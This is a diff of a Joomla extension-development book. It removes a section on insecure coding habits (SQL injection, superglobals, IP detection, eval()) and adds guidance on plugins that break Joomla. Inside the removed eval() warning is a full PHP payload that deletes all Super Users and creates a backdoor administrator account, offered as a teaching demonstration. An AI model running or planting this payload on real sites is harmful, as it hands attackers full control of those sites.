@@ -358,431 +358,6 @@
       definitely make it into the book but I will at least promise to give it
       a good thought and most likely a good try.</para>
     </section>
-
-    <section xml:id="intro-write-code-dont-suck">
-      <title>Write code which doesn't suck</title>
-
-      <para>Having audited several dozens of sites with hundreds of extensions
-      I have seen the same old problems appearing in the code of extension
-      after extension. Not only they are security incidents waiting to happen,
-      they also make migrating your code to newer Joomla versions harder and
-      break your extension in said Joomla versions.</para>
-
-      <section xml:id="intro-dont-suck-hardcoded-queries">
-        <title>DON'T: Hard-coded database queries</title>
-
-        <para>I have seen bad code like this:</para>
-
-        <programlisting language="php">$query = 'SELECT `something` FROM `#__whatever` WHERE `id` = ' . $db-&gt;quote($id);</programlisting>
-
-        <para>It's even worse with there is no <code>$db-&gt;quote</code> at
-        all because that ensures it's a SQL injection waiting to
-        happen.</para>
-
-        <para>Having a hard-coded database query is really bad because you are
-        making an assumption the site runs under MySQL and that the escape
-        character is the backtick. This is not a guarantee. Moreover, are you
-        absolutely sure that you have not missed an escape in a long SQL
-        query? Would you bet your and your clients' sites' security, as well
-        as the possibility of massive fines due to GDPR if you have failed
-        miserably, on your ability to not miss anything?</para>
-
-        <para>Let's get real. Joomla has offered a database query builders
-        since version 1.6 (released in 2010) and improved it in Joomla
-        4.</para>
-
-        <para>Here's the simplest way to write the above code:</para>
-
-        <programlisting language="php">$query = $db-&gt;getQuery(true)
-  -&gt;select($db-&gt;quoteName('something'))
-  -&gt;from($db-&gt;quoteName('#__whatever'))
-  -&gt;where($db-&gt;quoteName('id') . ' = ' . $db-&gt;quote($id));</programlisting>
-
-        <para>This is still not a very good approach because <code>$id</code>
-        may look like a numeric string but actually be a hidden SQL Injection.
-        Therefore a better way to write this query is using prepared
-        statements which send the raw value of $id to the server and tell it
-        what data type it is (boolean, null, blob, string or integer). The
-        value is not interpolated into the query itself, making it perfectly
-        safe against SQL injection attacks.</para>
-
-        <programlisting language="php">$query = $db-&gt;getQuery(true)
-  -&gt;select($db-&gt;quoteName('something'))
-  -&gt;from($db-&gt;quoteName('#__whatever'))
-  -&gt;where($db-&gt;quoteName('id') . ' = :id')
-  -&gt;bind(':id', $id, \Joomla\Database\ParameterType::INTEGER);</programlisting>
-
-        <note>
-          <para>Prepared statements are only meant to be used when you have
-          data coming from a variable. If you have hard-coded data you can
-          still interpolate them after passing them through
-          <code>$db-&gt;quote()</code>.</para>
-
-          <para>Also note that any data —even data coming from another query
-          which ostensibly only includes “safe”, hard-coded data you have
-          inserted yourself in the database— MUST go through prepared
-          statements. Anything which is not hard-coded in the code currently
-          executing must be assumed to be potentially dangerous. Even data you
-          inserted in the database and the user cannot modify through the
-          interface <emphasis>can</emphasis> be modified by a malicious actor,
-          e.g. using a SQL injection vulnerability in another
-          extension.</para>
-
-          <para><emphasis role="bold">TRUST NO-ONE, NOT EVEN
-          YOURSELF.</emphasis></para>
-
-          <para>That's the motto of the security conscious developer.</para>
-        </note>
-      </section>
-
-      <section xml:id="intro-dont-suck-superglobals">
-        <title>DON'T: Using superglobalg ($_REQUEST, $_SERVER, $_GET, $_POST
-        etc)</title>
-
-        <para>Another very common problem I have seen in Joomla extensions is
-        developers doing something like this:</para>
-
-        <programlisting language="php">$something = $_REQUEST['something'];
-// or, worse, this
-$whatever = $_SERVER['WHATEVER'];</programlisting>
-
-        <para><emphasis role="bold">DO NOT DO THAT. THIS IS A SECURITY
-        ISSUE.</emphasis> There are very few cases where an extension needs
-        access to the raw PHP superglobals, namely if you are writing a
-        security extension and you need to check whether there's potentially
-        malicious data in the request before Joomla sanitizes it. If you are
-        one of the five or so people in the Joomla world writing this kind of
-        software you are unlikely to be reading this. If you are about to say
-        that you have a different, legitimate use case: you do NOT; you just
-        don't know how to use Joomla's input class. Sorry.</para>
-
-        <para>Joomla already provides an Input class which can return the
-        <emphasis>filtered and sanitised</emphasis> values of a request or
-        environment parameter. Moreover, it allows other parts of your code
-        and plugins to modify or override the input parameters.</para>
-
-        <para>The correct way to get something would be something like
-        this:</para>
-
-        <programlisting language="php">$something = \Joomla\CMS\Factory::getApplication()-&gt;input-&gt;request-&gt;getCmd('something', 'default');</programlisting>
-
-        <para>If the object you are working with has its own input property
-        use that instead of the global input object shown above. Dispatchers
-        and Controllers do have their own input object which can of course be
-        overridden during instantiation.</para>
-
-        <para>If the object you are working with has its own property which
-        gives you access to the application use that instead of going through
-        the CMS Factory. This makes your code reusable and testable across
-        applications.</para>
-
-        <para>Do NOT get input variables from your Model or View classes. Your
-        Controller should be the only point where you use the input object to
-        retrieve input parameters. You can pass these values to your model by
-        setting its <emphasis>state</emphasis>. Likewise, your view should
-        only ever read the model's state, not the input directly. This makes
-        your code reusable and testable. It also lets you make changes in the
-        naming of your input parameters only making a change in your
-        controller (and possibly your dispatcher) instead of trying to hunt
-        down random uses spread throughout your code. It also makes you think
-        about the data flow in your application which makes it infinitely
-        easier to debug it.</para>
-
-        <para>You should not use the entire request superglobal (e.g.
-        <code>$this-&gt;input-&gt;getCmd('something')</code> or
-        <code>$this-&gt;input-&gt;request-&gt;getCmd('something')</code>) if
-        you know that a specific piece of data can only come as GET or POST
-        data. Instead, be specific, e.g.
-        <code>$this-&gt;input-&gt;get-&gt;getCmd('something')</code> for GET
-        data and <code>$this-&gt;input-&gt;post-&gt;getCmd('something')</code>
-        for POST data. This prevents <emphasis>input shading</emphasis>. If
-        the same input is present in $_GET, $_POST, $_ENV, $_COOKIE and
-        $_SERVER you will only get one value in the request. Which one? It
-        depends on the PHP configuration (<code>request_order</code> and
-        <code>variables_order</code> configuration keys). While on
-        <emphasis>most</emphasis> servers it's GP (Get and Post, i.e. POST
-        data overrides GET data) it could actually be anything with
-        unpredictable consequences for your extension. For example, some
-        servers may stupidly include cookies in request_order, thereby
-        allowing a hacker to set a cookie on a victim's browser to make your
-        extension do something other than the user's reasonable expectation,
-        e.g. delete or modify a different record than what they were trying to
-        delete / edit.</para>
-
-        <para>Do not assume that the data you get from the input object is of
-        a specific scalar type. For example,
-        <code>$this-&gt;input-&gt;getInt('something')</code> may return an
-        integer, null (the default value) or <emphasis>an array of
-        integers</emphasis>. The latter is something that you are unlikely to
-        have come across but that's the way the <code>get()</code> method of
-        Joomla's input object works. Always check the type of the data you
-        receive, always assume that there is a hacker trying to inject invalid
-        data trying to trip your code up, always assume that any kind of
-        filtering or sanitization may fail to work the way you assume it
-        works.</para>
-
-        <para>If you want to access the $_SERVER and $_ENV superglobals;
-        don't. Instead go through <code>$this-&gt;input-&gt;server</code> and
-        <code>$this-&gt;input-&gt;env</code>. For example, if I want to get
-        the contents of the HTTP header X-Foo-Bar I should do
-        <code>$this-&gt;input-&gt;server-&gt;getString('HTTP_X_FOO_BAR');</code>.</para>
-
-        <para>Remember that Joomla can and will apply its text filters when
-        you use <code>getString</code>. If you want to get the raw data use
-        <methodname>getRaw</methodname> or <methodname>getArray</methodname> —
-        neither method applies any filtering.</para>
-
-        <para>Even though you can access the $_FILES superglobal with the
-        input object — <emphasis role="bold">DO NOT DO THAT</emphasis>! You
-        should never handle file uploads directly in your code. Always go
-        through Joomla's
-        <methodname>\Joomla\CMS\Filesystem\File::upload()</methodname> method.
-        Do remember that, by default, it will try to prevent unsafe files from
-        being uploaded. If you have a VERY good reason to allow “unsafe” files
-        (e.g. you expect that a ZIP file containing PHP files will be used
-        with your extension) and have taken responsible measures to prevent
-        security issues you can of course set its <code>$allowUnsafe</code>
-        parameter to <code>true</code>. If you need your extension to allow
-        uploading of files with extensions or MIME types which are not media
-        you can of course use custom file upload configuration in your own
-        extension. This means that the excuse you may have had for using
-        $_FILES directly is completely invalid so please don't let me see you
-        ever accessing superglobals again.</para>
-      </section>
-
-      <section xml:id="intro-dont-suck-remote-addr">
-        <title>DON'T: Using REMOTE_ADDR to get the user's IP</title>
-
-        <para>It is very common for extensions to need access to the user's IP
-        address. I see extensions doing silly things like this:</para>
-
-        <programlisting language="php">$ip = $_SERVER['REMOTE_ADDR'];
-$ip = $this-&gt;input-&gt;server-&gt;get('REMOTE_ADDR');</programlisting>
-
-        <para><emphasis role="bold">DO NOT DO THAT; THIS IS WRONG ON MANY
-        LEVELS!</emphasis></para>
-
-        <para>The first line tries to access the $_SERVER superglobal which,
-        as mentioned in the previous section, is a security issue waiting to
-        happen.</para>
-
-        <para>Both of these lines make a wrong assumption: that the
-        REMOTE_ADDR key of the server superglobal array will contain the
-        user's IP address. This is not true if the server is behind a load
-        balancer, CDN, firewall or any other kind of non-transparent proxy. In
-        these cases a different HTTP header —typically X-Forwarded-For— may be
-        used to convey the forwarding chain of IP addresses. However, you
-        should NOT attempt to read this header yourself for two reasons. First
-        of all, if the site is not behind a non-transparent proxy a malicious
-        actor can send a forged X-Forwarded-For header to trick your extension
-        into believing the request came from a different IP address than the
-        one it actually originates. Second, this header may contain more than
-        one IP addresses in a comma-separated list. Validating, sanitizing and
-        parsing that list is tricky and may lead to some very bad times and
-        security issues.</para>
-
-        <para>Joomla 3.10 and later (including all 4.x releases and beyond)
-        include a fork of my IPHelper class which deals with all of these
-        details automatically. They also expose user-facing options in the
-        Global Configuration so that the site owner can inform Joomla whether
-        their site is behind a non-transparent proxy server.</para>
-
-        <para>You can get the real IP address of the user with this:</para>
-
-        <programlisting language="php">$ip = \Joomla\Utilities\IpHelper::getIp();</programlisting>
-
-        <para>Even better, going through the IpHelper makes your code
-        <emphasis role="bold">testable</emphasis>. Your unit tests can simply
-        call:</para>
-
-        <programlisting language="php">\Joomla\Utilities\IpHelper::setIp('1.2.3.4');</programlisting>
-
-        <para>to set a fake IP address of your choice (IPv4 or IPv6).</para>
-
-        <para>Finally, IpHelper has two more handy methods:
-        <methodname>isIPv6</methodname> which tells you if you are dealing
-        with an IPv6 address and <methodname>IPinList</methodname> which lets
-        you figure out if an IP address is contained in an array which
-        consists of any combination of IPv4/IPv6 addresses, IPv4 ranges (e.g.
-        1.2.3.4-1.2.3.255), IPv4/IPv6 subnets in CIDR notation (e.g.
-        1.2.3.4/24) or IPv4 subnets in IP/Netmask notation (e.g.
-        192.168.1.0/255.255.255.0). Since many use cases for getting the
-        user's IP address ultimately come down to checking if it belongs in a
-        range of IP addresses or a list of allowed/blocked IP addresses you'll
-        find the latter method extremely handy. I went through the pain of
-        figuring out IP address maths and Joomla included my work in the core
-        so you don't have to deal with it yourself!</para>
-      </section>
-
-      <section xml:id="intro-dont-suck-duplicate-libraries">
-        <title>DON'T: Include duplicate copies of libraries shipped with
-        Joomla itself</title>
-
-        <para>A few weeks ago I was troubleshooting a client's Joomla 3 site
-        and I noticed that there were six extensions which in total included
-        four copies of TCPDF, six copies of SimplePie and four copies of
-        PHPMailer. All these libraries are already shipped with Joomla
-        itself.</para>
-
-        <para>Do NOT include copies of libraries already included in Joomla
-        with your software. If you absolutely have to —because you need a
-        newer version than what Joomla provides— <emphasis role="bold">DO NOT
-        USE THE SAME NAMESPACE AND CLASS NAMES</emphasis>. It will break
-        Joomla or third party extensions when your code is loaded.</para>
-
-        <para>In fact, even if you are including third libraries which are not
-        included in Joomla you should be doing one of the following:</para>
-
-        <itemizedlist>
-          <listitem>
-            <para>Do NOT load third party libraries except in a component's
-            model which is never going to be used outside of your
-            component.</para>
-          </listitem>
-
-          <listitem>
-            <para>Change the namespace of your third party libraries using
-            Rector.</para>
-          </listitem>
-        </itemizedlist>
-
-        <para>The first method is not a fool-proof way to go about it. The
-        third party library you are using may be included in Joomla or a
-        different third party extension (worst case scenario: a system plugin
-        which always loads this library) therefore causing your own code to
-        break. This happened to me when I contributed the WebAuthn code to
-        Joomla 4, thereby breaking my Login with Apple plugin which was using
-        a newer version of one of the libraries used by the WebAuthn code.
-        Oops.</para>
-
-        <para>Changing the namespace of your dependencies with Rector is
-        fairly trivial and guarantees that any third party libraries you
-        include in your code will neither interfere with core or third party
-        code, nor will they be interfered with by core or third party code.
-        It's one more (small and simple) step building your extensions but it
-        can make a massively positive difference to your clients who construct
-        their sites out of prepackaged, mass-distributed code they can't (and
-        usually don't even know how to) modify.</para>
-      </section>
-
-      <section xml:id="intro-dont-suck-evil-eval">
-        <title>DON'T: Using <code>eval()</code></title>
-
-        <para>Let me start by saying that allowing users to enter arbitrary
-        PHP code which will be executed by the site is a <emphasis
-        role="bold">VERY BAD IDEA</emphasis>. It is very easy for anyone with
-        minimal developer experience —or someone following a how-to hacking
-        guide— to take over a site. The following took me 5' to write and it's
-        a complete takeover of a site:</para>
-
-        <caution>
-          <para><emphasis role="bold">DO NOT TRY THIS ON YOUR
-          SITE!</emphasis></para>
-
-          <para>The following code deletes all Super Users and adds a new
-          Super User. This is detrimental to your site. It's only meant to
-          demonstrate how easily a site can be taken over if a developer
-          allows arbitrary PHP execution.</para>
-        </caution>
-
-        <programlisting language="php">function hackMePlenty()
-{
-    $user = \Joomla\CMS\Factory::getContainer()
-        -&gt;get(\Joomla\CMS\User\UserFactoryInterface::class)
-        -&gt;loadUserByUsername('drevil1234');
-
-    if ($user-&gt;username === 'drevil1234') return;
-
-    $db    = \Joomla\CMS\Factory::getContainer()-&gt;get('DatabaseDriver')
-    $query = $db-&gt;getQuery(true)
-        -&gt;select([$db-&gt;quoteName('id')])
-        -&gt;from($db-&gt;quoteName('#__usergroups'));
-
-    $superUserGroups = array_filter(
-        $db-&gt;setQuery($query)-&gt;loadColumn(0) ?: [],
-        function ($group) {
-            return \Joomla\CMS\Access\Access::checkGroup($group, 'core.admin');
-        }
-    );
-
-    $existingSuperUsers = array_unique(
-        array_reduce(
-            $superUserGroups,
-            function (array $carry, int $groupId) {
-                return array_merge($carry, \Joomla\CMS\Access\Access::getUsersByGroup($groupId));
-            },
-            []
-        )
-    );
-
-    if (!empty($existingSuperUsers))
-    {
-        $query = $db-&gt;getQuery(true)
-            -&gt;delete($db-&gt;quoteName('#__users'))
-            -&gt;whereIn($db-&gt;quoteName('id'), $existingSuperUsers);
-        $db-&gt;setQuery($query)-&gt;execute();
-    }
-
-    $user = new \Joomla\CMS\Table\User($db);
-    $user-&gt;save([
-        'name' =&gt; 'Evil Hacker',
-        'username' =&gt; 'drevil1234',
-        'email' =&gt; 'drevil@example.com',
-        'password' =&gt; \Joomla\CMS\User\UserHelper::hashPassword('Dr3v!L0wnzJ00'),
-        'block' =&gt; 0,
-        'sendEmail' =&gt; 1,
-        'registerDate' =&gt; (new \Joomla\CMS\Date\Date('2004-08-08 01:02:03'))-&gt;toSql(),
-        'lastVisitDate' =&gt; (new \Joomla\CMS\Date\Date())-&gt;toSql(),
-        'activation' =&gt; '',
-        'groups' =&gt; $superUserGroups
-    ]);
-}
-
-try { hackMePlenty(); } catch (\Throwable $e) { }</programlisting>
-
-        <para>For this reason, whenever I see an extension which deliberately
-        allows PHP code to be inserted and executed I am worried. If I see
-        this being allowed in an editor or other text entry field without
-        checking that the data comes from a Super User I am immediately
-        labelling the extension a massive security issue and the site
-        compromised unless proven differently.</para>
-
-        <para>As a developer you should NEVER, EVER have a feature which
-        allows direct PHP execution. This includes this happening
-        unintentionally by using the evil <code>eval()</code>. Also note that
-        most hosts disable <code>eval()</code> so idiot developers won't
-        create backdoors the size of Alaska on the sites hosted on that
-        host.</para>
-
-        <para>There are very few cases where you might want to evaluate
-        <emphasis>generated</emphasis> (as opposed to <emphasis>user
-        defined</emphasis>) PHP code. For example, when I implemented a subset
-        of the Blade template language in FOF I was converting Blade files to
-        straight up PHP. Of course, I could not run the generated code through
-        <code>eval()</code>. The solution to that is to first try to create a
-        temporary file —either in Joomla's temporary directory or a cache
-        directory— and <code>include()</code> it. If the temporary directory
-        is unwriteable you can use
-        <code>class_exists(\Joomla\Filesystem\Buffer::class, true);</code>
-        which includes Joomla's buffer class. This registers the stream
-        handler <code>buffer://</code> which creates a filesystem in memory.
-        You can write to a file in it, e.g.
-        <code>file_put_contents('buffer://foobar.php', $theContents);</code>
-        and then include it like this
-        <code>include('buffer://foobar.php');</code>. The downside with the
-        buffer method is that on some hosts with hardened PHP runtimes you
-        cannot include executable files from stream wrappers which have not
-        been explicitly allowed by the server administrator. Hence the need to
-        go through the filesystem first.</para>
-
-        <para>As I said, you should only ever evaluate PHP code in your
-        extensions if you have written it or if your own code has generated
-        it. <emphasis role="bold">DO NOT TRUST THE USER —NOT EVEN SUPER USERS—
-        TO PROVIDE EXECUTABLE PHP CODE THEMSELVES; IT IS A MASSIVE SECURITY
-        ISSUE</emphasis>. Do you hear that, form component developers? Your
-        extensions make it trivial to hack people's sites. Fix 'em!</para>
-      </section>
-    </section>
   </chapter>
 
   <chapter xml:id="concepts">
@@ -9817,7 +9392,7 @@ return $plugin;</programlisting>
         always stored in the backend (even if it runs in the frontend of the
         site), the overrides Joomla loads if the plugin is executing in the
         frontend of the site are those set for the site's frontend or marked
-        as for both front- and backend. </para>
+        as for both front- and backend.</para>
 
         <para>If you think about it, it makes sense. The frontend and backend
         of the site target different kinds of users. The public frontend may
@@ -9851,6 +9426,434 @@ return $plugin;</programlisting>
 
     <section xml:id="plg-dont-break-joomla">
       <title>How NOT to break Joomla with your plugin</title>
+
+      <para>Plugins are fundamental part of our sites. They can do a lot of
+      useful things and extend Joomla in ways the core may have not been
+      designed to. For this reason plugins have a lot of power over the entire
+      Joomla application. A mistake in a plugin can bring down a site or cause
+      unexpected and unresolvable issues in third party components, plugins
+      and modules.</para>
+
+      <para>The root cause of these problems us typically that the plugin
+      author did test their plugin, but have only done so in the very narrow
+      use case they expect their plugins to be used. This is called “<link
+      xlink:href="https://en.wikipedia.org/wiki/Happy_path">happy path</link>
+      testing” and is almost as bad as no testing at all. When the plugin is
+      used in any other context — the CLI application, non-HTML output, in
+      cases where the output format may not be determined until after the
+      component for the page has finished executing — it might cause
+      unintended consequences, i.e. the site will break. Even worse, clients
+      will start blaming the innocent parties: Joomla itself and third party
+      developers whose software is written the right way and works perfectly
+      fine.</para>
+
+      <para>To best demonstrate how easy it is to make grave mistakes with too
+      little code let's see a plugin class which makes <emphasis
+      role="bold">four</emphasis> major mistakes in six lines of code:</para>
+
+      <programlisting language="php">class PlgSystemFoobar extends \Joomla\CMS\Plugin\CMSPlugin
+{
+  public function __construct(&amp;$subject, $config)
+  {
+    parent::__construct($subject, $config);
+
+    if (\Joomla\CMS\Factory::getApplication()-&gt;isClient('administrator')) return;
+
+    $document = \Joomla\CMS\Factory::getDocument();
+    $document-&gt;addScript(\Joomla\CMS\Uri\Uri::root(true) . 'plugins/system/foobar/js/foobar.js');
+  }
+}</programlisting>
+
+      <para>This looks like a deceptively simple system plugin. It adds a
+      JavaScript file to every page load in the frontend. Right? </para>
+
+      <para>Well, that is its intention but not what it actually does. It also
+      breaks Joomla 4's CLI and API applications, it breaks pages with
+      non-HTML output, it forbids components from using non-HTML output and
+      tries to load the JavaScript file from the wrong place.</para>
+
+      <bridgehead>Do not execute plugin logic in the plugin
+      constructor</bridgehead>
+
+      <para>Let's think about Joomla's lifetime. In broad terms, the request
+      ends up getting handled by Joomla's <filename>index.php</filename> file.
+      This spins up the Joomla! application, e.g.
+      <code>\Joomla\CMS\Application\SiteApplication</code> for the frontend.
+      The main entry point for the application object is the
+      <code>doExecute</code> method. This method does a lot of initialisation
+      before routing and dispatching the application, meaning that this
+      initialisation takes place before Joomla has parsed SEF URLs or created
+      a document object. In fact, Joomla will load all enabled <emphasis
+      role="bold">system</emphasis> plugins before Joomla has figured out any
+      basic facts about itself. </para>
+
+      <para>The developer of this plugin put their business logic in the
+      constructor of the plugin which is executed at this early stage of the
+      Joomla application initialisation. While
+      <methodname>isClient()</methodname> will work, the rest of the code
+      which tries to get the document object will break the site. </para>
+
+      <para>The plugin erroneously goes through the
+      <methodname>\Joomla\CMS\Factory::getDocument()</methodname> method to
+      get the document. This is deprecated in Joomla 4. You are supposed to
+      use the <methodname>getDocument()</methodname> method of the application
+      object. Had the developer done that they'd have seen that they are
+      getting null because the document has not been created yet. </para>
+
+      <para>In fact, all this code should be moved from the plugin object
+      constructor to the <code>onAfterDispatch</code> method to work
+      correctly. </para>
+
+      <bridgehead>Do not go through the
+      <classname>\Joomla\CMS\Factory</classname> </bridgehead>
+
+      <para>The second problem with this plugin is the exact reason why the
+      Factory's <methodname>getDocument()</methodname> method is deprecated.
+      </para>
+
+      <para>Calling the factory's <methodname>getDocument()</methodname>
+      method will forcibly create a document object which will then be used by
+      the application object. The document object is created based on the
+      information in the request. However, as you might recall, at this point
+      Joomla has not yet parsed the SEF route! This would also be true if this
+      code was moved in the <code>onAfterInitialise</code> event, the earliest
+      system plugin event triggered by Joomla. </para>
+
+      <para>Since the SEF URL has not been parsed Joomla cannot reliably know
+      the type of document to use. Think for example about a URL like
+      <uri>https://www.example.com/foobar.json</uri> which when gone through
+      the SEF URL router will, among other things, set <uri>format=json</uri>
+      in the request. This means that this request expects Joomla to create a
+      <classname>\Joomla\CMS\Document\JsonDocument</classname> document
+      object. </para>
+
+      <para>However, since <uri>format=json</uri> has not been set yet, Joomla
+      will assume <uri>format=html</uri> when you call
+      <methodname>getDocument()</methodname>. Therefore, it will create a
+      <classname>\Joomla\CMS\Document\HtmlDocument</classname> document object
+      which will be used by the application object as well. This will of
+      course break the component which is handling the request as it
+      (correctly) expect a JSONDocument and it instead gets an HTMLDocument. I
+      think we can all agree that the plugin's author is at fault for this
+      mess.</para>
+
+      <para>You should only ever call <emphasis role="bold">two
+      methods</emphasis> of the <classname>\Joomla\CMS\Factory</classname> in
+      Joomla 4: </para>
+
+      <itemizedlist>
+        <listitem>
+          <para><methodname>getContainer()</methodname>. This returns Joomla's
+          Dependency Injection container (DI Container, sometimes abbreviated
+          as DIC). If possible, you should avoid using it directly, instead
+          pushing dependencies through the service provider of your
+          extension.</para>
+        </listitem>
+
+        <listitem>
+          <para><methodname>getApplication()</methodname>. This returns the
+          current Joomla application object handling the request. If possible,
+          your extension should be passed the application object from its
+          service provider instead of getting the object through the factory
+          in your extension's code. The service provider will still have to go
+          through the factory as there is not yet a single container resource
+          which returns the currently active application (but this might
+          change in Joomla 5.0 and will almost definitely change by Joomla
+          6.0).</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>To get the application's document you should do
+      <code>\Joomla\CMS\Factory::getApplication()-&gt;getDocument();</code>.
+      </para>
+
+      <bridgehead>There is more to Joomla than HTML output </bridgehead>
+
+      <para>This is an absurdly common mistake. Developers seem to assume that
+      Joomla will only ever generate HTML output. This is an unreasonable
+      assumption since Joomla 1.0 was released in 2005 — not to mention that
+      it was not a reasonable assumption in Mambo, Joomla's predecessor,
+      either. Joomla is perfectly capable of generating non-HTML output such
+      as XML, JSON, RSS feeds, Atom feeds, raw binary output (e.g. images) and
+      so on and so forth. If there was ever a question as to whether this is
+      possible, changes made early in the Joomla 3.x releases introducing new
+      core document and view classes should have driven that point
+      home.</para>
+
+      <para>The developer of this plugin made the
+      <emphasis>unreasonable</emphasis> assumption that their
+      <varname>$document</varname> will always contain an
+      <classname>HTMLDocument</classname>. </para>
+
+      <para>A URL like
+      <uri>https://www.example.com/index.php?option=com_whatever&amp;format=json</uri>
+      — despite the two problems already mentioned above — would still
+      populate <varname>$document</varname> with a
+      <classname>JSONDocument</classname> object. However,
+      <classname>JSONDocument</classname> does not have an
+      <methodname>addScript</methodname> method. Therefore this plugin causes
+      a PHP fatal error right away. Whoops!</para>
+
+      <para>The correct way to do that is called “feature detection”: </para>
+
+      <programlisting language="php">$document = \Joomla\CMS\Factory::getApplication()-&gt;getDocument();
+
+if (!($document instanceof \Joomla\CMS\Document\HtmlDocument))
+{
+  return;
+}</programlisting>
+
+      <para>If the document returned by our application is not an
+      <classname>HTMLDocument</classname> we do not try to do anything else.
+      Simple, isn't it?</para>
+
+      <bridgehead>There is more to Joomla than the frontend and backend
+      </bridgehead>
+
+      <para>Now let's get to the biggest bug of them all: assuming that Joomla
+      consists entirely of the frontend (site) and backend (administrator)
+      application. This has not been true since Joomla 1.6, released in
+      <emphasis>2010</emphasis>. When I first wrote this section in 2022 it
+      was already <emphasis>12 years</emphasis> this assumption has been wrong
+      and I would still see plugins making it and breaking Joomla
+      sites.</para>
+
+      <para>Not to put too fine a point on this, this line is completely
+      wrong: </para>
+
+      <programlisting language="php">if (\Joomla\CMS\Factory::getApplication()-&gt;isClient('administrator')) return;
+</programlisting>
+
+      <para>Clearly, the developer wanted their code to mean “if this is not
+      the frontend of the site don't do anything”. Instead, what they actually
+      wrote is “if this is the backend of the site — therefore this is the
+      frontend of the site <emphasis>or the api application, or the console
+      application, or any custom application which extends from Joomla's
+      <classname>WebApplication</classname> class</emphasis> — don't do
+      anything”. Whoops! </para>
+
+      <para>As we have already mentioned, Joomla 4 has a number of
+      applications shipped with it:</para>
+
+      <itemizedlist>
+        <listitem>
+          <para><emphasis role="bold">installation</emphasis>. This is the web
+          installer when you build a new site. Third party code, like our
+          counterexample system plugin, does not load in it and does not
+          concern third party developers. It lives in the
+          <filename>installation</filename> folder of your site. It's been
+          around since Joomla 1.0. </para>
+
+          <note>
+            <para>If an <filename>installation</filename> folder is present
+            Joomla will redirect to it if you try to access any of its other
+            web-based applications. This happens very early in the
+            <filename>includes/framework.php</filename> file which is one of
+            the first things loaded by <filename>includes/app.php</filename>,
+            after loading <filename>includes/defines.php</filename> and making
+            sure the <filename>libraries/vendor</filename> folder
+            exists.</para>
+
+            <para>This automatic redirection does not happen when
+            <constant>\Joomla\CMS\Version::DEV_STATUS</constant> is anything
+            other than <parameter>stable</parameter>, i.e. in
+            <parameter>alpha</parameter>, <parameter>beta</parameter>,
+            <parameter>rc</parameter> (Release candidate) releases and
+            <parameter>dev</parameter> (development) builds from the Joomla
+            Git repository sources.</para>
+          </note>
+        </listitem>
+
+        <listitem>
+          <para><emphasis role="bold">site</emphasis>. The frontend of the
+          site, accessed through the <filename>index.php</filename> file in
+          your site's root. It's been around since Joomla 1.0. </para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis role="bold">administrator</emphasis>. The backend of
+          the site, accessed through
+          <filename>administrator/index.php</filename>. It lives in the
+          <filename>administrator</filename> folder of your site. It's been
+          around since Joomla 1.0. </para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis role="bold">api</emphasis>. The JSON API
+          application, accessed through <filename>api/index.php</filename>. It
+          lives in the <filename>api</filename> folder of your Joomla site.
+          Introduced in Joomla 4.0. </para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis role="bold">cli</emphasis>. The
+          <filename>cli/joomla.php</filename> command line application.
+          Introduced in Joomla 4.0. </para>
+        </listitem>
+      </itemizedlist>
+
+      <para>Further to that, applications other than site and administrator
+      have existing since Joomla 1.5. </para>
+
+      <para>From Joomla 1.5 onwards it's been possible to create your own
+      custom application by extending <classname>JApplicationWeb</classname>.
+      These custom application do load system plugins by default. They were
+      used to create custom entry points for callbacks, e.g. in payment
+      plugins for e-commerce components. They are no longer used as the reason
+      for their existence has been made a moot point since the advent of
+      <code>com_ajax</code> in Joomla 2.5. </para>
+
+      <para>From Joomla 1.6 and up until Joomla 5.4 it's possible for
+      developers to create custom CLI applications by extending
+      <classname>JApplicationCli</classname>. These applications do not load
+      system plugins by default so they are unlikely to have broken. Unlikely
+      does not mean impossible, though; it's possible that a CLI application
+      may have a need to load plugins such as <filename>system</filename>,
+      <filename>content</filename>, <filename>privacy</filename> etc.</para>
+
+      <para>This is why despite the fact that this has been an issue since the
+      dawn of Joomla 1.5 in 2007 plugin developers may have not bumped into
+      this until Joomla 4 was released. </para>
+
+      <para>The correct way to do this is, of course, to check explicitly for
+      the application you want to run under:</para>
+
+      <programlisting language="php">if (!\Joomla\CMS\Factory::getApplication()-&gt;isClient('<emphasis
+          role="bold">site</emphasis>')) return;</programlisting>
+
+      <bridgehead>Do not load static resources directly and/or from your
+      plugin's folder </bridgehead>
+
+      <para>This is a bonus round and not a bug which will break sites
+      <emphasis>today</emphasis>, but it will break sites come Joomla 6.0 and
+      a mild security concern. It also eases us into the next section on <link
+      linkend="plg-wam">using the WebAssetManager</link> which is why I chose
+      to put this interlude section here in this book.</para>
+
+      <para>The developer of the extension chose to load their static
+      JavaScript file using the deprecated
+      <methodname>addScript()</methodname> method of the document and located
+      the file in the plugin's folder structure. This is a two in one issue.
+      </para>
+
+      <para>First of all, ever since Joomla 1.5 (released in 2007 —
+      <emphasis>15 years</emphasis> before I first wrote this section in 2022)
+      Joomla introduced the <filename>media</filename> folder where extensions
+      are expected to place all publicly available static files, be they
+      static files shipped with the extension or user-generated content
+      managed outside Joomla's Media Manager. </para>
+
+      <para>The developer of the plugin should have placed their JavaScript
+      file in the <filename>media/plg_system_foobar/js</filename> folder using
+      the following section in their plugin's XML manifest: </para>
+
+      <programlisting language="xml">&lt;media folder="media" destination="plg_system_foobar"&gt;
+    &lt;folder&gt;js&lt;/folder&gt;
+    &lt;file&gt;joomla.asset.json&lt;/file&gt;
+&lt;/media&gt;</programlisting>
+
+      <para>(We'll see what the joomla.asset.json file is in a moment) </para>
+
+      <para>It is a bad security practice mixing executable backend code
+      (<filename>.php</filename> files) with frontend executable code
+      (<filename>.js</filename>, <filename>.es6</filename> etc) files and
+      static media files (CSS, images, videos, ...). </para>
+
+      <para>Joomla is moving towards placing all frontend (web browser)
+      accessible stuff into the media folder — even for templates, as of
+      Joomla 4.1 — and will most likely start applying security controls to
+      prevent web access to the plugin, component, module etc folders.
+      <emphasis role="bold">You have been warned</emphasis>. In fact, you were
+      being warned since 2007 but nobody was listening, so let's see how many
+      developers will come screaming bloody murder when these access controls
+      are enforced about <emphasis>20 years</emphasis> after the preferred
+      alternative was introduced in Joomla 1.5.0. Ahem. forgive me, I
+      digressed.</para>
+
+      <para>The next issue is that HTMLDocument's
+      <methodname>addScript()</methodname> method has been deprecated. Joomla
+      4 has moved into using asset dependencies and a <link
+      linkend="concepts-webassetmanager">Web Asset Manager</link> to, well,
